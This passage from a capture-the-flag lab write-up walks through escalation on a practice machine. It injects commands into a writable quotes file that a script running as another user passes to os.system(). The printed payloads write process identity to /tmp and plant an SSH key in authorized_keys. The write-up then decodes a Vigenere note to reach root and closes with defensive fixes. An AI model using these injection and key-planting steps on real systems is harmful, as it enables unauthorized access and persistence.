# 4. SSH as `weston`

After obtaining the password, log in with SSH:

```bash
ssh weston@<TARGET_IP>
```

Basic checks:

```bash
whoami
id
pwd
ls -la
ls -la /home
```

Two users are visible:

```text
/home/weston
/home/cage
```

However, `weston` cannot simply enter `/home/cage`. That means we need another path.

---

# 5. The Broadcast Clue: The Noisy Speaker

While logged in as `weston`, broadcast messages appear periodically:

```text
Broadcast message from cage@national-treasure (...)
<random Nicholas Cage quote>
```

This is a huge clue.

Why? Because the message comes from user `cage`. That suggests an automated process is running as `cage` and sending quotes to all terminals.

Search for related scripts and files:

```bash
find /opt /var/www /home/weston -maxdepth 5 -type f 2>/dev/null | grep -Ei 'dad|cage|quote|task|script'
```

Interesting results:

```text
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
```

---

# 6. Root Cause: Writable Input + `os.system()`

Check permissions:

```bash
ls -la /opt/.dads_scripts
ls -la /opt/.dads_scripts/.files
```

Check whether the quote file is writable:

```bash
test -w /opt/.dads_scripts/.files/.quotes && echo "WRITABLE" || echo "NOT WRITABLE"
```

The result confirms that the file is writable by our current context.

Read the script:

```bash
sed -n '1,200p' /opt/.dads_scripts/spread_the_quotes.py
```

Core logic:

```python
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```

The important part is:

```python
os.system("wall " + quote)
```

Easy analogy:

A robot speaker is supposed to read a sentence from a piece of paper.

If the paper says:

```text
Hello everyone
```

The robot runs:

```text
wall Hello everyone
```

But if the paper contains shell control characters, the shell may interpret extra instructions. That means the “quote” is not just text anymore; it can influence what the shell runs.

The root cause is the combination of three things:

```text
weston can modify .quotes
+ a process running as cage reads .quotes
+ the script passes that input into os.system()
= command injection path from weston to cage
```

---

# 7. Safe Validation: Who Runs the Script?

Before doing any pivot, validate the execution context.

Back up the quote file:

```bash
cp /opt/.dads_scripts/.files/.quotes /tmp/quotes.backup
```

Use a harmless validation step that writes the process identity into `/tmp`:

```bash
echo 'hello_from_weston; id > /tmp/cage_check' > /opt/.dads_scripts/.files/.quotes
```

Wait for the automated broadcaster to run, then check:

```bash
cat /tmp/cage_check
```

The output confirms that the command ran as user `cage`.

**Important correction:** this is not a reverse shell. This is **command injection used for user pivoting**.

---

# 8. Pivoting to `cage` with SSH Key Access

To make the access stable and clean, use SSH keys instead of relying on the broadcaster forever.

On the local machine:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/thm_cage -N ""
cat ~/.ssh/thm_cage.pub
```

Copy the public key.

From the `weston` session, use the same injection route to prepare SSH access for `cage`. In a public writeup, keep the key as a placeholder:

```bash
PUB='YOUR_PUBLIC_KEY_HERE'
printf 'hello; mkdir -p /home/cage/.ssh; echo "%s" >> /home/cage/.ssh/authorized_keys; chmod 700 /home/cage/.ssh; chmod 600 /home/cage/.ssh/authorized_keys\n' "$PUB" > /opt/.dads_scripts/.files/.quotes
```

Wait for the broadcaster to execute. Then log in from the local machine:

```bash
ssh -i ~/.ssh/thm_cage cage@<TARGET_IP>
```

Once access is confirmed, restore the original quotes:

```bash
cat /tmp/quotes.backup > /opt/.dads_scripts/.files/.quotes
```

---

# 9. User Flag: Cage's Room Is Open

As `cage`:

```bash
whoami
pwd
ls -la
```

Two interesting items appear:

```text
email_backup
Super_Duper_Checklist
```

Read the checklist:

```bash
cat Super_Duper_Checklist
```

The user flag is inside this file.

> Safe writeup format: `THM{REDACTED}`

---

# 10. Intended Root Path: Emails and the `FACE` Clue

Move into the email backup folder:

```bash
cd ~/email_backup
ls -la
```

Read each email:

```bash
for f in email_*; do
  echo "===== $f ====="
  cat "$f"
  echo
done
```

Two important clues appear:

1. Sean's username is hinted to be `root`.
2. There is a strange note:

```text
haiinspsyanileph
```

The email repeatedly emphasizes the word:

```text
FACE
```

Since the room already used Vigenere earlier, the same pattern is worth trying again.

CyberChef recipe:

```text
Vigenere Decode
Key: face
Input: haiinspsyanileph
```

The decoded output gives the root password.

> Safe note: the decoded password is intentionally redacted.

---

# 11. Root and Final Flag

Use the decoded value:

```bash
su - root
```

After becoming root:

```bash
whoami
cd /root
ls -la
```

The root email backup contains the final flag:

```bash
cd /root/email_backup
ls
cat email_*
```

> Safe writeup format: `THM{REDACTED}`

---

# Key Lessons

## 1. Do not tunnel-vision on the website

The web page looked cool, but it was mostly decoration. FTP was the actual starting point.

## 2. Anonymous FTP is always worth checking

If anonymous login is enabled, grab and inspect every readable file. Tiny files often contain huge clues.

## 3. Patterns repeat in CTFs

The first credential used:

```text
Base64 + Vigenere
```

The root stage reused Vigenere with a different key. Once a room teaches you a trick, keep that trick in your mental toolbox.

## 4. Broadcast messages are not random noise

A message appearing from another user means a process exists somewhere. Processes running as another user are worth investigating carefully.

## 5. The bug is the combination

No single issue alone tells the whole story. The dangerous combination was:

```text
writable input
+ higher-privileged scheduled/automated process
+ unsafe shell execution
```

## 6. Correct terminology matters

This was not a reverse shell. The better name is:

```text
Command injection → user pivot
```

---

# Defensive Takeaways

If we were fixing this system:

1. Do not use `os.system()` with user-controlled input.
2. Prefer `subprocess.run()` with argument lists and `shell=False`.
3. Do not let lower-privileged users modify input files consumed by another user's process.
4. Restrict `.quotes` so only the owner can write it.
5. Audit cron jobs and automated scripts that run under different users.

Safer concept:

```python
import subprocess

subprocess.run(["wall", quote], shell=False)
```

This prevents characters such as `;` from becoming shell command separators.

---

# Closing Thoughts

This room is fun because it feels like reading a weird diary, opening a secret note, and discovering a robot speaker that trusts paper too much.

Main lesson:

```text
Patient enumeration + clue reading + permission awareness = CTF progress
```

You do not always need a complicated exploit. Sometimes the key questions are:

> Who can write this file?  
> Who reads this file?  
> Does the input become plain text, or does it reach a shell?

Once those questions are answered, the path becomes clear.

